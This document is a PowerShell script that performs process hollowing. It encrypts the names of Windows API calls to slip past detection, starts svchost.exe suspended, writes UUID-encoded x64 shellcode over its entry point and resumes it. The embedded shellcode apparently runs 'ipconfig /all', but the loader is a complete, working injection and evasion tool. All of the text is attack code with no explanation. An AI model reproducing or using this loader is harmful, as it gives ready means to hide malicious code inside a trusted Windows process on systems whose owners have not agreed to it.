Function UUID_Process_Hollowing_Delegate {

    function Invoke-FunctionLookup {
        Param (
            [Parameter(Position = 0, Mandatory = $true)] 
            [string] $moduleName,
            [Parameter(Position = 1, Mandatory = $true)] 
            [string] $functionName
        )
    
        $systemType = ([AppDomain]::CurrentDomain.GetAssemblies() | 
            Where-Object { $_.GlobalAssemblyCache -and $_.Location.Split('\\')[-1] -eq $dsystem_dll }
        ).GetType($dMicrosoft_Win32_UnsafeNativeMethods)
    
        $getProcAddressMethod = $systemType.GetMethods() | Where-Object { $_.Name -eq $dGetProcAddress }
        $moduleHandle = $systemType.GetMethod($dGetModuleHandle).Invoke($null, @($moduleName))
        return $getProcAddressMethod[0].Invoke($null, @($moduleHandle, $functionName))
    }
    
    function Invoke-GetDelegate {
        Param (
            [Parameter(Position = 0, Mandatory = $true)] 
            [Type[]] $parameterTypes,
            [Parameter(Position = 1, Mandatory = $false)] 
            [Type] $returnType = [Void]
        )
    
        $assemblyBuilder = [AppDomain]::CurrentDomain.DefineDynamicAssembly(
            (New-Object System.Reflection.AssemblyName($dReflectedDelegate)),
            [System.Reflection.Emit.AssemblyBuilderAccess]::Run
        )
    
        $moduleBuilder = $assemblyBuilder.DefineDynamicModule($dInMemoryModule, $false)
    
        $typeBuilder = $moduleBuilder.DefineType(
            'MyDelegateType', 
            [System.Reflection.TypeAttributes]::Class -bor 
            [System.Reflection.TypeAttributes]::Public -bor 
            [System.Reflection.TypeAttributes]::Sealed -bor 
            [System.Reflection.TypeAttributes]::AnsiClass -bor 
            [System.Reflection.TypeAttributes]::AutoClass, 
            [System.MulticastDelegate]
        )
    
        $constructorBuilder = $typeBuilder.DefineConstructor(
            [System.Reflection.MethodAttributes]::RTSpecialName -bor 
            [System.Reflection.MethodAttributes]::HideBySig -bor 
            [System.Reflection.MethodAttributes]::Public,
            [System.Reflection.CallingConventions]::Standard,
            $parameterTypes
        )
    
        $constructorBuilder.SetImplementationFlags(
            [System.Reflection.MethodImplAttributes]::Runtime -bor 
            [System.Reflection.MethodImplAttributes]::Managed
        )
    
        $methodBuilder = $typeBuilder.DefineMethod(
            'Invoke',
            [System.Reflection.MethodAttributes]::Public -bor 
            [System.Reflection.MethodAttributes]::HideBySig -bor 
            [System.Reflection.MethodAttributes]::NewSlot -bor 
            [System.Reflection.MethodAttributes]::Virtual,
            $returnType,
            $parameterTypes
        )
    
        $methodBuilder.SetImplementationFlags(
            [System.Reflection.MethodImplAttributes]::Runtime -bor 
            [System.Reflection.MethodImplAttributes]::Managed
        )
    
        return $typeBuilder.CreateType()
    }
    
    

    function Invoke-DecryptAES {
        param (
            [byte[]]$Data,
            [string]$KeyBase64,
            [string]$IVBase64,
            [switch]$Bytes
        )

        $Key = [System.Convert]::FromBase64String($KeyBase64)
        $IV = [System.Convert]::FromBase64String($IVBase64)

        $AES = [Security.Cryptography.SymmetricAlgorithm]::Create('AES')
        $AES.Key = $Key
        $AES.IV = $IV

        $decryptor = $AES.CreateDecryptor($AES.Key, $AES.IV)
        $memoryStream = New-Object -TypeName IO.MemoryStream -ArgumentList (, $Data)
        $cryptoStream = New-Object -TypeName Security.Cryptography.CryptoStream -ArgumentList @($memoryStream, $decryptor, 'Read')

        $decryptedBytes = New-Object -TypeName Byte[] -ArgumentList $Data.Length
        $decryptedByteCount = $cryptoStream.Read($decryptedBytes, 0, $decryptedBytes.Length)
    
        $cryptoStream.Close()
        $memoryStream.Close()

        if ($Bytes) {
            return $decryptedBytes[0..($decryptedByteCount - 1)]
        }
        else {
            $decryptedString = [System.Text.Encoding]::UTF8.GetString($decryptedBytes[0..($decryptedByteCount - 1)])

            if ($decryptedString -like "*_END_*") {
                $decryptedString = $decryptedString -replace "_END_$", ""
            }

            return $decryptedString
        }
    }
    
    $assemblies = [AppDomain]::CurrentDomain.GetAssemblies()
    $nativeMethodsType = $assemblies | Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1] -eq 'system.dll' } | ForEach-Object { $_.GetType('Microsoft.Win32.NativeMethods') }
    
    $startupInformationType = $assemblies | Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1] -eq 'system.dll' } | ForEach-Object { $_.GetType('Microsoft.Win32.NativeMethods+STARTUPINFO') }
    $processInformationType = $assemblies | Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1] -eq 'system.dll' } | ForEach-Object { $_.GetType('Microsoft.Win32.SafeNativeMethods+PROCESS_INFORMATION') }
    
    $startupInformation = $startupInformationType.GetConstructors().Invoke($null)
    $processInformation = $processInformationType.GetConstructors().Invoke($null)
    
    $CreateProcess = $nativeMethodsType.GetMethod('CreateProcess')
    
    # Start: Invoke-EncryptAES -InputStrings "system.dll, GetProcAddress, GetModuleHandle, Microsoft.Win32.UnsafeNativeMethods, Kernel32.dll, ReflectedDelegate, InMemoryModule, ntdll.dll, ReadProcessMemory, WriteProcessMemory, ResumeThread, CloseHandle, ZwQueryInformationProcess"
    [string] $GlobalKey = 'Xhh8BrnbS3wxTLN5WVKIap8ZaJKA8N57UVn+vyZp7Vk='
    [string] $GlobalIV = 'obR3k/S/C1xBP4kr45OKxw=='

    [Byte[]] $dsystem_dll_Bytes = + 0x31, 0x30, 0xF7, 0x23, 0x8F, 0x1A, 0x5C, 0x9C, 0x99, 0xAD, 0x66, 0x08, 0x5F, 0x49, 0x37, 0x77
    [string] $dsystem_dll = Invoke-DecryptAES -Data $dsystem_dll_Bytes -KeyBase64 $GlobalKey -IVBase64 $GlobalIV

    [Byte[]] $dGetProcAddress_Bytes = + 0xF3, 0x8F, 0x8A, 0x4F, 0x80, 0x4F, 0x51, 0x1D, 0x0D, 0xD2, 0xCE, 0x78, 0x13, 0x86, 0x63, 0x89
    [string] $dGetProcAddress = Invoke-DecryptAES -Data $dGetProcAddress_Bytes -KeyBase64 $GlobalKey -IVBase64 $GlobalIV

    [Byte[]] $dGetModuleHandle_Bytes = + 0x69, 0xC7, 0x30, 0x44, 0x12, 0x6E, 0xF8, 0x7A, 0x65, 0xA9, 0x8C, 0x1E, 0x32, 0x27, 0x66, 0x21
    [string] $dGetModuleHandle = Invoke-DecryptAES -Data $dGetModuleHandle_Bytes -KeyBase64 $GlobalKey -IVBase64 $GlobalIV

    [Byte[]] $dMicrosoft_Win32_UnsafeNativeMethods_Bytes = + 0x1B, 0x8B, 0xCD, 0xB7, 0x2D, 0x28, 0xBE, 0xB3, 0x41, 0x86, 0x6D, 0xD5, 0xF4, 0xF4, 0xF0, 0x73, 0x99, 0x8C, 0x21, 0xD8, 0xB8, 0xFF, 0x28, 0xC7, 0x8F, 0x58, 0x85, 0xE5, 0x10, 0x30, 0x65, 0x58, 0x93, 0xC8, 0x46, 0x40, 0xB5, 0xCF, 0x73, 0xE3, 0x60, 0xD2, 0x83, 0x93, 0xBE, 0x1E, 0x83, 0x9E
    [string] $dMicrosoft_Win32_UnsafeNativeMethods = Invoke-DecryptAES -Data $dMicrosoft_Win32_UnsafeNativeMethods_Bytes -KeyBase64 $GlobalKey -IVBase64 $GlobalIV

    [Byte[]] $dKernel32_dll_Bytes = + 0x47, 0x2B, 0x43, 0xF2, 0xB5, 0xEA, 0x59, 0x2C, 0x31, 0x59, 0x75, 0xBA, 0xB6, 0x96, 0x94, 0x41
    [string] $dKernel32_dll = Invoke-DecryptAES -Data $dKernel32_dll_Bytes -KeyBase64 $GlobalKey -IVBase64 $GlobalIV

    [Byte[]] $dReflectedDelegate_Bytes = + 0x01, 0xEB, 0x6C, 0x9B, 0x8C, 0xB9, 0xFC, 0x2D, 0xAB, 0xA4, 0x0F, 0x21, 0x44, 0xB1, 0x87, 0x36, 0x62, 0xAC, 0x43, 0xA2, 0x48, 0x47, 0x5A, 0x02, 0xDF, 0xE4, 0xBF, 0x40, 0xC0, 0x5D, 0x30, 0xBC
    [string] $dReflectedDelegate = Invoke-DecryptAES -Data $dReflectedDelegate_Bytes -KeyBase64 $GlobalKey -IVBase64 $GlobalIV

    [Byte[]] $dInMemoryModule_Bytes = + 0x03, 0x11, 0x41, 0xF9, 0x71, 0x9C, 0x3B, 0x0B, 0xA4, 0x5B, 0x2C, 0x62, 0x4E, 0x79, 0xBB, 0x3F
    [string] $dInMemoryModule = Invoke-DecryptAES -Data $dInMemoryModule_Bytes -KeyBase64 $GlobalKey -IVBase64 $GlobalIV

    [Byte[]] $dntdll_dll_Bytes = + 0x17, 0x81, 0xDC, 0x01, 0x48, 0xBA, 0x62, 0xFF, 0x82, 0x70, 0xDE, 0x8E, 0xBD, 0xE6, 0xC3, 0xDF
    [string] $dntdll_dll = Invoke-DecryptAES -Data $dntdll_dll_Bytes -KeyBase64 $GlobalKey -IVBase64 $GlobalIV

    [Byte[]] $dReadProcessMemory_Bytes = + 0x34, 0x49, 0x5D, 0xEE, 0x0D, 0x2D, 0xAE, 0x84, 0xDF, 0xE3, 0x16, 0xEA, 0xAE, 0xB8, 0x2E, 0x2E, 0xC6, 0x24, 0xE2, 0x5F, 0xF6, 0x66, 0xE7, 0x71, 0x7F, 0x79, 0x77, 0x3D, 0xD5, 0x98, 0xB4, 0xD2
    [string] $dReadProcessMemory = Invoke-DecryptAES -Data $dReadProcessMemory_Bytes -KeyBase64 $GlobalKey -IVBase64 $GlobalIV

    [Byte[]] $dWriteProcessMemory_Bytes = + 0x88, 0xA7, 0x5A, 0xE0, 0x25, 0x82, 0x13, 0xFF, 0x00, 0xD4, 0x8F, 0x84, 0x74, 0x2B, 0x56, 0x21, 0x4D, 0xAE, 0x15, 0x21, 0x91, 0x4C, 0x80, 0x30, 0x5B, 0x83, 0x19, 0xA9, 0xFC, 0x96, 0x3F, 0x23
    [string] $dWriteProcessMemory = Invoke-DecryptAES -Data $dWriteProcessMemory_Bytes -KeyBase64 $GlobalKey -IVBase64 $GlobalIV

    [Byte[]] $dResumeThread_Bytes = + 0x02, 0x51, 0xBA, 0xE7, 0xF5, 0x22, 0x55, 0xF9, 0x8E, 0x13, 0xAB, 0xF2, 0xD4, 0xA9, 0x17, 0xF4
    [string] $dResumeThread = Invoke-DecryptAES -Data $dResumeThread_Bytes -KeyBase64 $GlobalKey -IVBase64 $GlobalIV

    [Byte[]] $dCloseHandle_Bytes = + 0x76, 0x9B, 0x52, 0x5C, 0x35, 0x1D, 0x06, 0xE7, 0xA5, 0x3E, 0x63, 0xBD, 0x24, 0x25, 0xD0, 0x64
    [string] $dCloseHandle = Invoke-DecryptAES -Data $dCloseHandle_Bytes -KeyBase64 $GlobalKey -IVBase64 $GlobalIV

    [Byte[]] $dZwQueryInformationProcess_Bytes = + 0xF7, 0xE1, 0x45, 0x60, 0x1F, 0xA6, 0x52, 0xDC, 0xEA, 0x2F, 0xE6, 0xE3, 0x48, 0x56, 0x47, 0xC1, 0xFE, 0xB9, 0x90, 0x21, 0x28, 0xBC, 0x4A, 0xD8, 0x65, 0xEB, 0x17, 0x79, 0x1E, 0x57, 0xFC, 0xA7
    [string] $dZwQueryInformationProcess = Invoke-DecryptAES -Data $dZwQueryInformationProcess_Bytes -KeyBase64 $GlobalKey -IVBase64 $GlobalIV
    # End: Output from Invoke-EncryptAES
    
    $RPM = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((Invoke-FunctionLookup -moduleName $dKernel32_dll -functionName $dReadProcessMemory), (Invoke-GetDelegate @([IntPtr], [IntPtr], [byte[]], [int], [IntPtr]) ([Bool]))) 
    $WPM = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((Invoke-FunctionLookup -moduleName $dKernel32_dll -functionName $dWriteProcessMemory), (Invoke-GetDelegate @([IntPtr], [IntPtr], [byte[]], [Int], [IntPtr]) ([Bool])))
    $RT = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((Invoke-FunctionLookup -moduleName $dKernel32_dll -functionName $dResumeThread), (Invoke-GetDelegate @([IntPtr]) ([void])))
    $CH = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((Invoke-FunctionLookup -moduleName $dKernel32_dll -functionName $dCloseHandle), (Invoke-GetDelegate @([IntPtr]) ([bool])))  
    $ZwQIP = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((Invoke-FunctionLookup -moduleName $dntdll_dll -functionName $dZwQueryInformationProcess), (Invoke-GetDelegate @([IntPtr], [Int], [Byte[]], [UInt32], [UInt32]) ([int])))
    
    $CurrentPath = (Get-Item -Path ".\" -Verbose).FullName
    
    $cmd = [System.Text.StringBuilder]::new("C:\\Windows\\System32\\svchost.exe")
    $CreateProcess.Invoke($null, @($null, $cmd, $null, $null, $false, 0x4, [IntPtr]::Zero, $CurrentPath, $startupInformation, $processInformation))  > $null
    
    $ThreadHandle = $processInformation.hThread
    $ProcessHandle = $processInformation.hProcess
    
    $processBasicInformation = [System.Byte[]]::CreateInstance([System.Byte], 48)
    $tmp = [UInt32]0
    $ZwQIP.Invoke($ProcessHandle, 0, $processBasicInformation, $processBasicInformation.Length, $tmp)  > $null
    $pBaseAddress = [BitConverter]::ToInt64($processBasicInformation, 8)
    $ImagePTR = [IntPtr]($pBaseAddress + 0x10)
    
    [byte[]] $AddressBuffer = New-Object byte[] ([IntPtr]::Size)
    $readSuccess = $RPM.Invoke($ProcessHandle, $ImagePTR, $AddressBuffer, $AddressBuffer.Length, [IntPtr]::Zero)  > $null
    
    $TargetProcessBase = [IntPtr]::Zero
    if ([IntPtr]::Size -eq 8) { $TargetProcessBase = [IntPtr]::new([System.BitConverter]::ToInt64($AddressBuffer, [IntPtr]::Zero)) }
    else { $TargetProcessBase = [IntPtr]::new([System.BitConverter]::ToInt32($AddressBuffer, [IntPtr]::Zero)) }
    
    $TargetProcessBaseInt64 = [UInt64]$TargetProcessBase.ToInt64()
    
    [byte[]] $data = New-Object byte[] 0x200
    $RPM.Invoke($ProcessHandle, $TargetProcessBase, $data, 0x200, [IntPtr]::Zero)  > $null
    
    $file_index = [BitConverter]::ToUInt32($data, 0x3C)
    $header_loc = $file_index + 0x28
    $exec_start_rva = [BitConverter]::ToUInt32($data, [int]$header_loc)
    $EntryPointAddress = [IntPtr]::new($exec_start_rva + $TargetProcessBaseInt64)
    
    [Array] $UUIDs = @(
        #
        # Start: Output from Convert-UUID.ps1
        "e48348fc-e8f0-00c0-0000-415141505251",
        "d2314856-4865-528b-6048-8b5218488b52",
        "728b4820-4850-b70f-4a4a-4d31c94831c0",
        "7c613cac-2c02-4120-c1c9-0d4101c1e2ed",
        "48514152-528b-8b20-423c-4801d08b8088",
        "48000000-c085-6774-4801-d0508b481844",
        "4920408b-d001-56e3-48ff-c9418b348848",
        "314dd601-48c9-c031-ac41-c1c90d4101c1",
        "f175e038-034c-244c-0845-39d175d85844",
        "4924408b-d001-4166-8b0c-48448b401c49",
        "8b41d001-8804-0148-d041-5841585e595a",
        "59415841-5a41-8348-ec20-4152ffe05841",
        "8b485a59-e912-ff57-ffff-5d48ba010000",
        "00000000-4800-8d8d-0101-000041ba318b",
        "d5ff876f-f0bb-a2b5-5641-baa695bd9dff",
        "c48348d5-3c28-7c06-0a80-fbe07505bb47",
        "6a6f7213-5900-8941-daff-d5636d642e65",
        "2f206578-206b-7069-636f-6e666967202f",
        "006c6c61-9090-9090-9090-909090909090"
        # End Output from Convert-UUID.ps1
        #
    )

    $Warhead = New-Object byte[] ($uuids.Length * 16)
    for ($i = 0; $i -lt $uuids.Length; $i++) {
        $guid = [Guid]::Parse($uuids[$i])
        $guidBytes = $guid.ToByteArray()
        [Buffer]::BlockCopy($guidBytes, 0, $Warhead, $i * 16, 16)
    }

    $WPM.Invoke($ProcessHandle, $EntryPointAddress, $Warhead, $Warhead.Length, [IntPtr]::Zero) > $null
    $RT.Invoke($processInformation.hThread) > $null
    $CH.Invoke($processInformation.hProcess) > $null
    $CH.Invoke($processInformation.hThread) > $null
    
} UUID_Process_Hollowing_Delegate
